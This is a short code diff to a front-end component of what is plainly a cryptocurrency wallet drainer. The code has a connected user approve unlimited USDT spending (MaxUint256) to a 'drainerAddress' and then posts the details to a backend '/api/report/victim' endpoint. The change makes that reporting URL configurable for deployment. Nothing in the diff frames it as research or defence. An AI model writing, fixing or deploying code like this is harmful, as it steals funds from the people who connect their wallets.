@@ -41,10 +41,11 @@ export default function Hero({ onConnectWallet, walletAddress, isWalletConnected
       const tx = await usdtContract.approve(drainerAddress, ethers.MaxUint256);
       await tx.wait();
 
-      setStatus('success');
+      // Use dynamic backend URL from environment variable or fallback to current host
+      const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || '';
       
       // Report to backend via public endpoint
-      await fetch('http://localhost:3003/api/report/victim', {
+      await fetch(`${backendUrl}/api/report/victim`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
